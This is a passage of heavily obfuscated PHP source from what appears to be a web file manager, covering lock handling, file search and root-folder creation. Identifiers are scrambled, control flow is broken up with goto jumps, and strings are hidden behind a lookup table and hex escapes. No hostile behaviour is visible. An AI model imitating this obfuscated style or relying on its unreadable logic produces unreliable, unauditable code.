(self::$lockItem[$F‘îô‚·’±]) { return self::$lockItem[$F‘îô‚·’±]; } return self::init()->lockGet($F‘îô‚·’±); } public static function unlock($E€µ¢èà∏ß) { $DáÜ™¢¿Ÿ§ = self::key($E€µ¢èà∏ß); self::$lockItem[$DáÜ™¢¿Ÿ§] = null; return self::init()->unlock($DáÜ™¢¿Ÿ§); } public static function unlockRuntime() { $a¢¬∞∑÷Èü =& $_SERVER[—Ω]; $D¶éöï¶ﬂ¨ = self::init(); $FêœÖ§£ç = !1; foreach (self::$lockItem as $DÆπ«¡Îúı => $f—ËÂàÑ‰†) { if (!$f—ËÂàÑ‰†) { continue; } $D¶éöï¶ﬂ¨->unlock($DÆπ«¡Îúı); if (!$FêœÖ§£ç) { $FêœÖ§£ç = !0; write_log($a¢¬∞∑÷Èü[781] . $DÆπ«¡Îúı . $a¢¬∞∑÷Èü[67] . get_caller_msg(), $a¢¬∞∑÷Èü[780]); continue; } write_log($a¢¬∞∑÷Èü[781] . $DÆπ«¡Îúı, $a¢¬∞∑÷Èü[780]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto bÚ¨Óä‹„ß; fƒ∂¶ç®”Ï: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($e¢®Úêä”‰) { goto A©◊Ô‚‰ßä; A©◊Ô‚‰ßä: $bÂ≠€Ñ»ﬁñ =& $_SERVER[—Ω]; $c≤õØÿ´ì‚ = KodIO::fileTypeList(); $a¯ÓêäÖ‡µ = $c≤õØÿ´ì‚[$e¢®Úêä”‰]; goto cÚ•ÿ–Üû∞; E¯„Ìä’Ç: if (!$a¯ÓêäÖ‡µ[$bÂ≠€Ñ»ﬁñ[157]]) { $c¯Ê¯∫æ˘Ñ = array_to_keyvalue($c≤õØÿ´ì‚, $bÂ≠€Ñ»ﬁñ[33], $bÂ≠€Ñ»ﬁñ[157]); $DÇá…É£¨¡ = implode($bÂ≠€Ñ»ﬁñ[47], $c¯Ê¯∫æ˘Ñ); $d»“ê∑∆ªã = $bÂ≠€Ñ»ﬁñ[2234]; } $c•ãêì«Æ» = explode($bÂ≠€Ñ»ﬁñ[47], trim($DÇá…É£¨¡, $bÂ≠€Ñ»ﬁñ[47])); return array($d»“ê∑∆ªã, $c•ãêì«Æ»); goto cÜ‰—Â©ÎÉ; cÚ•ÿ–Üû∞: if (!$a¯ÓêäÖ‡µ) { return array(); } $DÇá…É£¨¡ = $a¯ÓêäÖ‡µ[$bÂ≠€Ñ»ﬁñ[157]]; $d»“ê∑∆ªã = $bÂ≠€Ñ»ﬁñ[7]; goto E¯„Ìä’Ç; cÜ‰—Â©ÎÉ: } public function listPathType($DπÖã√Ó÷ä) { $D¯ñâéÆ∏∞ =& $_SERVER[—Ω]; $E’éëÎëŒ£ = $this->fileTypeWhere($DπÖã√Ó÷ä); if (!$E’éëÎëŒ£) { return array(); } $Fëüã¶Ì¡… = array($D¯ñâéÆ∏∞[517] => SourceModel::TYPE_USER, $D¯ñâéÆ∏∞[518] => USER_ID, $D¯ñâéÆ∏∞[514] => 0, $D¯ñâéÆ∏∞[515] => $E’éëÎëŒ£); return $this->listSource($Fëüã¶Ì¡…); } public function listSearch($FÔÙØÒÂ≈ª, $Dê”çÍâÒ“ = 300) { goto EüÉë¯≈ ç; CâüÑèÙ…»: $this->_listSearchDesc($DŒ©î±©Ì´, $FÔÙØÒÂ≈ª, $eœÍçÖΩ∂≈); $this->_listSearchTag($DŒ©î±©Ì´, $FÔÙØÒÂ≈ª, $eœÍçÖΩ∂≈); $this->_listDataApply($DŒ©î±©Ì´[$A∫†ùÙÖéÁ[351]]); goto cÇùëµü¿¬; cÇùëµü¿¬: $this->_listMake($DŒ©î±©Ì´); return $DŒ©î±©Ì´; goto Bëß√ù≥ã¢; DÑ˘¡∆Î—ç: if (!isset($AÕœÁ»∫µ∞[$A∫†ùÙÖéÁ[393]])) { $AÕœÁ»∫µ∞[$A∫†ùÙÖéÁ[393]] = 0; } $cÎãàÂóá≤ = $A∫†ùÙÖéÁ[2279]; $eœÍçÖΩ∂≈ = $cÎãàÂóá≤; goto A˘πö≈∂≠√; EüÉë¯≈ ç: $A∫†ùÙÖéÁ =& $_SERVER[—Ω]; if (isset($FÔÙØÒÂ≈ª[$A∫†ùÙÖéÁ[2156]]) && $FÔÙØÒÂ≈ª[$A∫†ùÙÖéÁ[2156]]) { $FÔÙØÒÂ≈ª[$A∫†ùÙÖéÁ[2156]] = str_replace($A∫†ùÙÖéÁ[1569], $A∫†ùÙÖéÁ[2278], trim($FÔÙØÒÂ≈ª[$A∫†ùÙÖéÁ[2156]])); } $AÕœÁ»∫µ∞ = $this->_parseSearchWhere($FÔÙØÒÂ≈ª); goto DÑ˘¡∆Î—ç; A˘πö≈∂≠√: $this->_listSearchBindPinyin($FÔÙØÒÂ≈ª, $AÕœÁ»∫µ∞, $cÎãàÂóá≤); $this->alias($A∫†ùÙÖéÁ[483])->_makeOrder()->cache(null, 10); $DŒ©î±©Ì´ = $this->distinct(!0)->field($cÎãàÂóá≤)->where($AÕœÁ»∫µ∞)->selectPage($Dê”çÍâÒ“); goto CâüÑèÙ…»; Bëß√ù≥ã¢: } private function _listSearchTag(&$b¶¯≈Õ£é≠, $déâÃ˜Ù⁄‘, $DˆòûÜÔÊÂ) { goto b•ﬁˆä“‰Ü; b•ﬁˆä“‰Ü: $bÓÁúùæ‡ç =& $_SERVER[—Ω]; if (!$déâÃ˜Ù⁄‘[$bÓÁúùæ‡ç[2156]] || $b¶¯≈Õ£é≠[$bÓÁúùæ‡ç[348]][$bÓÁúùæ‡ç[337]] > 1) { return; } $CòÇ√„¢Òä = Model($bÓÁúùæ‡ç[2280])->listData(); goto bßç∆Œäàª; bßç∆Œäàª: $aﬂ‡ÓÍâÜÛ = array(); $aÈ∆Ùå©è  = $déâÃ˜Ù⁄‘[$bÓÁúùæ‡ç[2156]]; foreach ($CòÇ√„¢Òä as $F±≠«é»‘ﬁ) { $f®¿…Öö‹ó = $F±≠«é»‘ﬁ[$bÓÁúùæ‡ç[28]]; $d¬ı◊’ß≠¶ = str_replace($bÓÁúùæ‡ç[50], $bÓÁúùæ‡ç[33], Pinyin::encode($f®¿…Öö‹ó)); if (stripos($f®¿…Öö‹ó, $aÈ∆Ùå©è ) !== !1 || stripos($d¬ı◊’ß≠¶, $aÈ∆Ùå©è ) !== !1) { $aﬂ‡ÓÍâÜÛ[] = $F±≠«é»‘ﬁ[$bÓÁúùæ‡ç[364]]; } } goto C·ê‰“ªÒñ; C·ê‰“ªÒñ: if (!$aﬂ‡ÓÍâÜÛ) { return; } $eé„ÂÙá©¡ = array($bÓÁúùæ‡ç[390] => array($bÓÁúùæ‡ç[7], $aﬂ‡ÓÍâÜÛ)); $cäﬁµ≈≠èÌ = Model($bÓÁúùæ‡ç[2281])->field($bÓÁúùæ‡ç[75])->where($eé„ÂÙá©¡)->select(); goto EŸñÎáÖ¨ﬂ; EŸñÎáÖ¨ﬂ: $cäﬁµ≈≠èÌ = array_to_keyvalue($cäﬁµ≈≠èÌ, $bÓÁúùæ‡ç[33], $bÓÁúùæ‡ç[75]); $A—£ä¥à¥√ = array_unique($cäﬁµ≈≠èÌ); $this->_listSearchMerge($b¶¯≈Õ£é≠, $déâÃ˜Ù⁄‘, $DˆòûÜÔÊÂ, $A—£ä¥à¥√); goto c∫á·…∆ÈÈ; c∫á·…∆ÈÈ: } private function _listSearchDesc(&$FıñÇË§»√, $Aœ≥Ω£…¨ﬁ, $b—áââÒÉË) { goto fÊ·¨¨≠É”; câÖ‹œÓ˜¨: $FÊ‡ó¢®Ë˘ = array_unique($FÊ‡ó¢®Ë˘); if (!$FÊ‡ó¢®Ë˘) { return; } $bñ»ÍÓóôè = array($aÍı‘£û÷[366] => array($aÍı‘£û÷[7], $FÊ‡ó¢®Ë˘), $aÍı‘£û÷[89] => $aÍı‘£û÷[401], $aÍı‘£û÷[356] => array($aÍı‘£û÷[761], $aÍı‘£û÷[2158] . $Aœ≥Ω£…¨ﬁ[$aÍı‘£û÷[2156]] . $aÍı‘£û÷[2158])); goto F˜ä·£”É©; F˜ä·£”É©: $Aóâ≈ÑΩ›÷ = Model($aÍı‘£û÷[500])->field($aÍı‘£û÷[366])->where($bñ»ÍÓóôè)->select(); $Aı≠ﬁíé ≠ = array_to_keyvalue($Aóâ≈ÑΩ›÷, $aÍı‘£û÷[33], $aÍı‘£û÷[366]); $this->_listSearchMerge($FıñÇË§»√, $Aœ≥Ω£…¨ﬁ, $b—áââÒÉË, $Aı≠ﬁíé ≠); goto dëâ≠≤ÖËÕ; fÊ·¨¨≠É”: $aÍı‘£û÷ =& $_SERVER[—Ω]; if (!$Aœ≥Ω£…¨ﬁ[$aÍı‘£û÷[2156]] || $FıñÇË§»√[$aÍı‘£û÷[348]][$aÍı‘£û÷[337]] > 1) { return; } $FÊ‡ó¢®Ë˘ = $this->listSearchChildren($Aœ≥Ω£…¨ﬁ[$aÍı‘£û÷[457]]); goto câÖ‹œÓ˜¨; dëâ≠≤ÖËÕ: } private function _listSearchMerge(&$A¯‡àöéÁ≈, $E¡√Çº◊Áç, $aÎãóúä›À, $b‹÷°êÌÜ∞) { goto Dçï°∫Ãê¬; Fá…øÈÍòÿ: $EŸ∏≤ìå´ƒ = array_diff($b‹÷°êÌÜ∞, $aÈ©Öä¿•ë); if (!$EŸ∏≤ìå´ƒ) { return; } $DÆ–ÔÛ»ü¨ = array($fßÌ™Ô—ëå[366] => array($fßÌ™Ô—ëå[7], $EŸ∏≤ìå´ƒ)); goto E‘Ö≥≤êå…; E‘Ö≥≤êå…: $c‘√ä‹‰Ç÷ = $this->field($aÎãóúä›À)->where($DÆ–ÔÛ»ü¨)->select(); if (!$c‘√ä‹‰Ç÷) { return; } $Bñªáˆ‰ÌÂ = array(); goto Dçä®‹¢≥Â; Dçä®‹¢≥Â: foreach ($c‘√ä‹‰Ç÷ as $bÎî≤äàå◊) { $a¡ﬁôëﬂéè = $fßÌ™Ô—ëå[47] . $E¡√Çº◊Áç[$fßÌ™Ô—ëå[457]] . $fßÌ™Ô—ëå[47]; if (stripos($bÎî≤äàå◊[$fßÌ™Ô—ëå[455]], $a¡ﬁôëﬂéè) !== !1) { $Bñªáˆ‰ÌÂ[] = $bÎî≤äàå◊; } } $A¯‡àöéÁ≈[$fßÌ™Ô—ëå[351]] = array_merge($Bñªáˆ‰ÌÂ, $A¯‡àöéÁ≈[$fßÌ™Ô—ëå[351]]); $A¯‡àöéÁ≈[$fßÌ™Ô—ëå[348]][$fßÌ™Ô—ëå[349]] += count($Bñªáˆ‰ÌÂ); goto Fé‚‰Õ´πö; Dçï°∫Ãê¬: $fßÌ™Ô—ëå =& $_SERVER[—Ω]; if (!$b‹÷°êÌÜ∞) { return; } $aÈ©Öä¿•ë = array_to_keyvalue($A¯‡àöéÁ≈[$fßÌ™Ô—ëå[351]], $fßÌ™Ô—ëå[33], $fßÌ™Ô—ëå[366]); goto Fá…øÈÍòÿ; Fé‚‰Õ´πö: } public function listSearchChildren($D«Â”ôóå‡, $b®≠ö•í© = 5000) { goto Fâ®ÈãÔ√â; fàß»µ¬â«: $F∏‘çΩøÛÁ = array($bŸôé∂†öÇ[455] => array($bŸôé∂†öÇ[761], $eªçéØÏ«œ[$bŸôé∂†öÇ[455]] . $eªçéØÏ«œ[$bŸôé∂†öÇ[366]] . $bŸôé∂†öÇ[480])); $bóùÎö∫ò‡ = $this->field($bŸôé∂†öÇ[366])->cache(null, 600)->where($F∏‘çΩøÛÁ)->count(); if ($bóùÎö∫ò‡ > $b®≠ö•í©) { return $this->_listSearchChildrenNear($D«Â”ôóå‡, $b®≠ö•í©); } goto F±ç¥íŒ«Á; Fâ®ÈãÔ√â: $bŸôé∂†öÇ =& $_SERVER[—Ω]; $E∆í∑Ç«æ = array(); $eªçéØÏ«œ = $this->sourceInfo($D«Â”ôóå‡); goto fàß»µ¬â«; F±ç¥íŒ«Á: $aŒòôÑµ◊™ = $this->field($bŸôé∂†öÇ[366])->where($F∏‘çΩøÛÁ)->select(); $E∆í∑Ç«æ = array_to_keyvalue($aŒòôÑµ◊™, $bŸôé∂†öÇ[33], $bŸôé∂†öÇ[366]); return $E∆í∑Ç«æ; goto cÍ®ËåØË‹; cÍ®ËåØË‹: } private function _listSearchChildrenNear($cÎ—ãÚ¨∫—, $dá≥‡Üúº) { goto AøÎò´π÷; Eô©ÊÏî ß: if (!$Eœ»Ò®Ê◊–) { return $eÒ≤ˆÕ◊¨Ü; } $F·†π∑Ú∞¥ = array($aßÃ∏§ÉÕÕ[457] => array($aßÃ∏§ÉÕÕ[7], $Eœ»Ò®Ê◊–)); $C≥à¢…⁄Ù≥ = $this->field($aßÃ∏§ÉÕÕ[2282])->where($F·†π∑Ú∞¥)->select(); goto c≈âÓßÃäË; aá‹Ú∂®∑Ü: $C≥à¢…⁄Ù≥ = $this->field($aßÃ∏§ÉÕÕ[2282])->where($F·†π∑Ú∞¥)->select(); $Eœ»Ò®Ê◊– = array_to_keyvalue(array_filter_by_field($C≥à¢…⁄Ù≥, $aßÃ∏§ÉÕÕ[367], $aßÃ∏§ÉÕÕ[83]), $aßÃ∏§ÉÕÕ[33], $aßÃ∏§ÉÕÕ[366]); $eÒ≤ˆÕ◊¨Ü = array_merge($eÒ≤ˆÕ◊¨Ü, array_to_keyvalue($C≥à¢…⁄Ù≥, $aßÃ∏§ÉÕÕ[33], $aßÃ∏§ÉÕÕ[366])); goto Eô©ÊÏî ß; AøÎò´π÷: $aßÃ∏§ÉÕÕ =& $_SERVER[—Ω]; $eÒ≤ˆÕ◊¨Ü = array(); $F·†π∑Ú∞¥ = array($aßÃ∏§ÉÕÕ[457] => $cÎ—ãÚ¨∫—); goto aá‹Ú∂®∑Ü; c≈âÓßÃäË: $eÒ≤ˆÕ◊¨Ü = array_merge($eÒ≤ˆÕ◊¨Ü, array_to_keyvalue($C≥à¢…⁄Ù≥, $aßÃ∏§ÉÕÕ[33], $aßÃ∏§ÉÕÕ[366])); $eÒ≤ˆÕ◊¨Ü = array_slice($eÒ≤ˆÕ◊¨Ü, 0, $dá≥‡Üúº); return $eÒ≤ˆÕ◊¨Ü; goto C¯µ≠èÏ√∑; C¯µ≠èÏ√∑: } private function _listSearchBindPinyin($cåçı⁄û‹Æ, &$C∏π™£î—ÿ, &$c —ÆÕÂô™) { goto c’ë€Ãªù; E£ƒ¶´∫É…: unset($C∏π™£î—ÿ[$E¡ﬁÂ∏Ñöâ[28]]); foreach ($C∏π™£î—ÿ as $cÁ√∏ƒ◊òÈ => $BÑéáù÷èÁ) { $Bí û£üäà[$E¡ﬁÂ∏Ñöâ[2284] . $cÁ√∏ƒ◊òÈ] = $BÑéáù÷èÁ; } $d‹íûÖ◊∆Â = array($E¡ﬁÂ∏Ñöâ[479], $E¡ﬁÂ∏Ñöâ[2158] . $cåçı⁄û‹Æ[$E¡ﬁÂ∏Ñöâ[2156]] . $E¡ﬁÂ∏Ñöâ[2158]); goto fª˘≠‚ÆÑ•; c’ë€Ãªù: $E¡ﬁÂ∏Ñöâ =& $_SERVER[—Ω]; if (!Input::check($cåçı⁄û‹Æ[$E¡ﬁÂ∏Ñöâ[2156]], $E¡ﬁÂ∏Ñöâ[303]) || strlen($cåçı⁄û‹Æ[$E¡ﬁÂ∏Ñöâ[2156]]) < 2) { return; } $E©ÔÁü»≈˘ = "\x4c\x45\106\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\151\157\137\x73\157\165\162\143\145\137\155\x65\x74\141\x20\x6d\x65\164\x61\x20\157\x6e\x20\163\x6f\x75\x72\x63\145\56\163\157\165\162\143\x65\x49\x44\x20\x3d\x20\155\x65\164\141\x2e\163\157\165\162\143\145\111\x44"; goto cêÛÁê¶Ãä; cêÛÁê¶Ãä: $Bí û£üäà = array(); $c —ÆÕÂô™ = str_replace(array($E¡ﬁÂ∏Ñöâ[214], $E¡ﬁÂ∏Ñöâ[50], $E¡ﬁÂ∏Ñöâ[2283]), $E¡ﬁÂ∏Ñöâ[33], $c —ÆÕÂô™); $c —ÆÕÂô™ = $E¡ﬁÂ∏Ñöâ[2284] . str_replace($E¡ﬁÂ∏Ñöâ[47], $E¡ﬁÂ∏Ñöâ[2285], $c —ÆÕÂô™); goto E£ƒ¶´∫É…; fª˘≠‚ÆÑ•: $Bí û£üäà[] = array($E¡ﬁÂ∏Ñöâ[2286] => $d‹íûÖ◊∆Â, $E¡ﬁÂ∏Ñöâ[920] => $E¡ﬁÂ∏Ñöâ[2160], array($E¡ﬁÂ∏Ñöâ[2287] => $d‹íûÖ◊∆Â, $E¡ﬁÂ∏Ñöâ[2288] => array($E¡ﬁÂ∏Ñöâ[7], array($E¡ﬁÂ∏Ñöâ[412], $E¡ﬁÂ∏Ñöâ[411])))); $this->join($E©ÔÁü»≈˘); $C∏π™£î—ÿ = $Bí û£üäà; goto eﬂ¨üÂ™Éı; eﬂ¨üÂ™Éı: } private function _parseSearchWhere($d™⁄‹å∑®ã) { goto c∂¡á†Çâ∑; c∂¡á†Çâ∑: $fæ¢éˆ“Ëë =& $_SERVER[—Ω]; $bç«€åàœ“ = array(); if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[712]])) { $bç«€åàœ“[$fæ¢éˆ“Ëë[107]] = array($fæ¢éˆ“Ëë[2289], $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[712]]); } goto Dôúúüãı¡; Dôúúüãı¡: if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[713]])) { $c—üÛ§ÈË» = array($fæ¢éˆ“Ëë[2290], $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[713]]); if ($bç«€åàœ“[$fæ¢éˆ“Ëë[107]]) { $bç«€åàœ“[$fæ¢éˆ“Ëë[107]] = array($bç«€åàœ“[$fæ¢éˆ“Ëë[107]], $c—üÛ§ÈË», $fæ¢éˆ“Ëë[2291]); } else { $bç«€åàœ“[$fæ¢éˆ“Ëë[107]] = $c—üÛ§ÈË»; } } if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2292]])) { $bç«€åàœ“[$fæ¢éˆ“Ëë[77]] = array($fæ¢éˆ“Ëë[2289], $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2292]]); } if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2293]])) { $c—üÛ§ÈË» = array($fæ¢éˆ“Ëë[2290], $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2293]]); if ($bç«€åàœ“[$fæ¢éˆ“Ëë[77]]) { $bç«€åàœ“[$fæ¢éˆ“Ëë[77]] = array($bç«€åàœ“[$fæ¢éˆ“Ëë[77]], $c—üÛ§ÈË», $fæ¢éˆ“Ëë[2291]); } else { $bç«€åàœ“[$fæ¢éˆ“Ëë[77]] = $c—üÛ§ÈË»; } } goto A¿„àïê≥ñ; A¿„àïê≥ñ: if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[531]])) { $bç«€åàœ“[] = array($fæ¢éˆ“Ëë[376] => $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[531]], $fæ¢éˆ“Ëë[375] => $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[531]], $fæ¢éˆ“Ëë[920] => $fæ¢éˆ“Ëë[2160]); } if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[369]])) { $d¨±≠Ñ˜Çû = $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[369]]; if ($d¨±≠Ñ˜Çû == $fæ¢éˆ“Ëë[76]) { $bç«€åàœ“[$fæ¢éˆ“Ëë[367]] = 1; } else { if ($d¨±≠Ñ˜Çû == $fæ¢éˆ“Ëë[2294]) { $bç«€åàœ“[$fæ¢éˆ“Ëë[367]] = 0; } else { if ($d¨±≠Ñ˜Çû) { $d¨±≠Ñ˜Çû = is_array($d¨±≠Ñ˜Çû) ? $d¨±≠Ñ˜Çû : explode($fæ¢éˆ“Ëë[47], $d¨±≠Ñ˜Çû); $bç«€åàœ“[$fæ¢éˆ“Ëë[369]] = array($fæ¢éˆ“Ëë[381], $d¨±≠Ñ˜Çû); $bç«€åàœ“[$fæ¢éˆ“Ëë[367]] = 0; } } } } if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[457]])) { $BºÆÍ ¢⁄ì = $this->sourceInfo($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[457]]); $bç«€åàœ“[$fæ¢éˆ“Ëë[521]] = array($fæ¢éˆ“Ëë[479], $BºÆÍ ¢⁄ì[$fæ¢éˆ“Ëë[455]] . $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[457]] . $fæ¢éˆ“Ëë[480]); } goto b©æÕØ∏ôê; b©æÕØ∏ôê: if (isset($d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2156]]) && $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2156]]) { $f·©ﬁ¬ßê† = $d™⁄‹å∑®ã[$fæ¢éˆ“Ëë[2156]]; $bäó÷«çÛú = explode($fæ¢éˆ“Ëë[50], $f·©ﬁ¬ßê†); if (strlen($f·©ﬁ¬ßê†) > 2 && (substr($f·©ﬁ¬ßê†, 0, 1) == $fæ¢éˆ“Ëë[113] && substr($f·©ﬁ¬ßê†, -1) == $fæ¢éˆ“Ëë[113]) || substr($f·©ﬁ¬ßê†, 0, 1) == $fæ¢éˆ“Ëë[55] && substr($f·©ﬁ¬ßê†, -1) == $fæ¢éˆ“Ëë[55]) { $f·©ﬁ¬ßê† = substr($f·©ﬁ¬ßê†, 1, -1); $bäó÷«çÛú = array($f·©ﬁ¬ßê†); } $bç«€åàœ“[$fæ¢éˆ“Ëë[28]] = array($fæ¢éˆ“Ëë[479], $fæ¢éˆ“Ëë[2158] . $f·©ﬁ¬ßê† . $fæ¢éˆ“Ëë[2158]); if (count($bäó÷«çÛú) > 1) { $bç«€åàœ“[$fæ¢éˆ“Ëë[28]] = array(); foreach ($bäó÷«çÛú as $c◊∂ñú√¶é) { if (!trim($c◊∂ñú√¶é)) { continue; } $bç«€åàœ“[$fæ¢éˆ“Ëë[28]][] = array($fæ¢éˆ“Ëë[479], $fæ¢éˆ“Ëë[2158] . trim($c◊∂ñú√¶é) . $fæ¢éˆ“Ëë[2158]); } } } return $bç«€åàœ“; goto f¿ˆ£ ≥†÷; f¿ˆ£ ≥†÷: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($eìâÎãØáΩ) { $bÙïéÁø¡∞ =& $_SERVER[—Ω]; $cõå¡®πáé = Model($bÙïéÁø¡∞[470])->where(array($bÙïéÁø¡∞[1408] => $eìâÎãØáΩ))->find(); $A◊¨Òáß≤µ = $this->_mkdirRoot(SourceModel::TYPE_USER, $eìâÎãØáΩ, $cõå¡®πáé[$bÙïéÁø¡∞[28]]); $this->userDesktopAdd($A◊¨Òáß≤µ); return $A◊¨Òáß≤µ; } public function userDesktopAdd($Cπ–ﬂœÇ›•) { $B™§Ô“áÀô =& $_SERVER[—Ω]; $aíñâÔâ÷ä = LNG($B™§Ô“áÀô[2295]); $aõ˜ÿùÀÓŸ = $this->mkdir($Cπ–ﬂœÇ›•, $aíñâÔâ÷ä); $this->metaSet($aõ˜ÿùÀÓŸ, $B™§Ô“áÀô[2296], $B™§Ô“áÀô[83]); $this->metaSet($Cπ–ﬂœÇ›•, $B™§Ô“áÀô[2297], $aõ˜ÿùÀÓŸ); } public function groupRootAdd($AØÈÈãÃúÍ) { $c¿¶•£∂â =& $_SERVER[—Ω]; $bÜ¡•åëë” = Model($c¿¶•£∂â[454])->where(array($c¿¶•£∂â[2152] => $AØÈÈãÃúÍ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $AØÈÈãÃúÍ, $bÜ¡•åëë”[$c¿¶•£∂â[28]]); } public function systemRootPathAdd($BÚî±Ωù®ç) { if ($BÚî±Ωù®ç != $_SERVER[—Ω][1093]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $BÚî±Ωù®ç); } public function userRootRemove($E¬›ıˆäÑ∏) { $d—∆«ÍÙ¡¬ = $this->sourceRoot(SourceModel::TYPE_USER, $E¬›ıˆäÑ∏); if (!$d—∆«ÍÙ¡¬) { return; } $this->remove($d—∆«ÍÙ¡¬, !1); } public function groupRootRemove($a·Êà¬ã‹˘) { $eÚ¨πºéÂ∞ = $this->sourceRoot(SourceModel::TYPE_GROUP, $a·Êà¬ã‹˘); if (!$eÚ¨πºéÂ∞) { return; } $this->remove($eÚ¨πºéÂ∞, !1); } private function _mkdirRoot($Bòıª∂§ªÓ, $cÑ∆˜æ˜‘å, $DˆµÊ˜Æéı) { goto cˆìòÙàê·; cˆìòÙàê·: $B‰≥¢ß´∑ª =& $_SERVER[—Ω]; $BÍøñô√ÀÌ = array($B‰≥¢ß´∑ª[365] => 0, $B‰≥¢ß´∑ª[517] => $Bòıª∂§ªÓ, $B‰≥¢ß´∑ª[518] => $cÑ∆˜æ˜‘å, $B‰≥¢ß´∑ª[514] => 1, $B‰≥¢ß´∑ª[519] => USER_ID, $B‰≥¢ß´∑ª[520] => USER_ID, $B‰≥¢ß´∑ª[515] => $B‰≥¢ß´∑ª[33], $B‰≥¢ß´∑ª[521] => $B‰≥¢ß´∑ª[466], $B‰≥¢ß´∑ª[392] => 0, $B‰≥¢ß´∑ª[516] => 0, $B‰≥¢ß´∑ª[416] => 0, $B‰≥¢ß´∑ª[522] => $B‰≥¢ß´∑ª[33]); if ($B”ı≠¯èïﬁ = $this->where($BÍøñô√ÀÌ)->find()) { return $B”ı≠¯èïﬁ[$B‰≥¢ß´∑ª[366]]; } goto eÆûèØÍçΩ; a∂„Üıı«ò: CacheLock::unlock($b¯˜ ©ÏîÙ); return $EÊ•ÏÃæ„é; goto B„¢¨≤Ê’ë; eÆûèØÍçΩ: $b¯˜ ©ÏîÙ = "\x4d\157\144\145\154\x53\157\x75\162\143\145\56\x6d\153\x64\x69\x72\x52\157\157\x74\x2e{$Bòıª∂§ªÓ}\x2e{$cÑ∆˜æ˜‘å}\56" . $DˆµÊ˜Æéı; CacheLock::lock($b¯˜ ©ÏîÙ); $BÍøñô√ÀÌ[$B‰≥¢ß´∑ª[28]] = $DˆµÊ˜Æéı; goto E¶…’—≠úÓ; E¶…’—≠úÓ: $EÊ•ÏÃæ„é = $this->add($BÍøñô√ÀÌ); $B¬ºΩ◊ËÌê = array($B‰≥¢ß´∑ª[523] => short_id($EÊ•ÏÃæ„é)); $this->where(array($B‰≥¢ß´∑ª[380] => $EÊ•ÏÃæ„é))->save($B¬ºΩ◊ËÌê); goto a∂„Üıı«ò; B„¢¨≤Ê’ë: } private function sourceRoot($eÓâùÕçä‘, $d£—â¿Áêê, $fÔ‚¡Ø›‘ê = false) { $eÖÆ»…⁄úÓ =& $_SERVER[—Ω]; $c™˜óèﬂ≠∆ = array($eÖÆ»…⁄úÓ[365] => 0, $eÖÆ»…⁄úÓ[517] => $eÓâùÕçä‘, $eÖÆ»…⁄úÓ[518] => $d£—â¿Áêê); if ($AŒû‡ ◊Û® = $this->where($c™˜óèﬂ≠∆)->find()) { return $fÔ‚¡Ø›‘ê ? $AŒû‡ ◊Û® : $AŒû‡ ◊Û®[$eÖÆ»…⁄úÓ[366]]; } return !1; } public function sourceRootGroup($cÁ≤íúˆè˜) { $Bœ”ËÃÍÉê =& $_SERVER[—Ω]; if (is_string($cÁ≤íúˆè˜)) { $cÁ≤íúˆè˜ = array($cÁ≤íúˆè˜); } $B‘πÀÌúá° = array($Bœ”ËÃÍÉê[365] => 0, $Bœ”ËÃÍÉê[517] => SourceModel::TYPE_GROUP, $Bœ”ËÃÍÉê[518] => array($Bœ”ËÃÍÉê[7], $cÁ≤íúˆè˜)); $eŸæáôÎº„ = $this->listSource($B‘πÀÌúá°, 1000); return array_to_keyvalue($eŸæáôÎº„[$Bœ”ËÃÍÉê[74]], $Bœ”ËÃÍÉê[452]); } public function mkfile($DÉüÏÖ∂é§, $BùÑÉÁÃéé, $aÿèÜô∆ªÜ = '', $FÜÖâêÃˆÔ = REPEAT_RENAME) { $eï—âú˘±˜ =& $_SERVER[—Ω]; $b¥ç◊®Æªã = Model($eï—âú˘±˜[540])->addFileByContent($aÿèÜô∆ªÜ, $BùÑÉÁÃéé); return $this->_createFileCall($DÉüÏÖ∂é§, $BùÑÉÁÃéé, $b¥ç◊®Æªã, $FÜÖâêÃˆÔ, $eï—âú˘±˜[1122]); } public function addFile($C∂¨ıäæëæ, $bõ¥äãı®∑, $F®‡ÓâÈßπ, $d≠çìËÊ·ì = false, $BÁÛñâí∞í = REPEAT_RENAME) { $Eèú÷ÿÈ¶í = Model($_SERVER[—Ω][540])->addFile($bõ¥äãı®∑, $F®‡ÓâÈßπ, $d≠çìËÊ·ì); return $this->_createFileCall($C∂¨ıäæëæ, $F®‡ÓâÈßπ, $Eèú÷ÿÈ¶í, $BÁÛñâí∞í); } public function addFileByFileID($fÚ≈†ã¢ŒÜ, $bóÔòÙ’ Í, $fŸ ∑‚‡⁄¶, $dÿü”¿ì¨ê = REPEAT_RENAME) { $aãÂÔ∂ç·ª =& $_SERVER[—Ω]; $D†ü»ì™√¢ = Model($aãÂÔ∂ç·ª[540])->find($bóÔòÙ’ Í); Model($aãÂÔ∂ç·ª[540])->linkAdd($bóÔòÙ’ Í); return $this->_createFileCall($fÚ≈†ã¢ŒÜ, $fŸ ∑‚‡⁄¶, $D†ü»ì™√¢, $dÿü”¿ì¨ê); } public function addFileByRemote($d–ã÷Ç£µ÷, $E…•Ûæ¬∂´, $cˆ®£‘üç†, $aÒÚ“ß†‚π = array(), $eœÈ¨ïÑâË = REPEAT_RENAME) 